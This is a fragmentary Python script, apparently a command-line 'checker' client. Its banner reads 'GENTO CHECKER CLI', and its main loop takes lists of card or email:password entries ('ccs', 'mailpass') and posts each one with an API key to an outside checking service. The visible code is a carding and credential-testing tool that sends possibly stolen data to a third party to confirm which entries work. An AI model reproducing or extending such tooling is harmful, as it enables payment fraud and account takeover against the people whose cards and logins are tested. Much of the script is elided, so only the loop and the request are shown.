...
def setup_config():
    if os.path.isfile('config.json'):
        ...
        |_____| |______ |  \_|    |    |_____| |_____  |     | |______ |_____  |    \_ |______ |    \_
                        ...
                        '''))
        print("GENTO CHECKER CLI PYTHON FOR OTHER SERVICES")
...
def checker(api_key):
    ...
    if api_data:
        ...
        for cc in ccs:
            cc = cc.strip()
            url = f'https://gento.systems/other/checker?api={api_key}&gate={gate_id}&mailpass={cc}'
            response = requests.post(url)
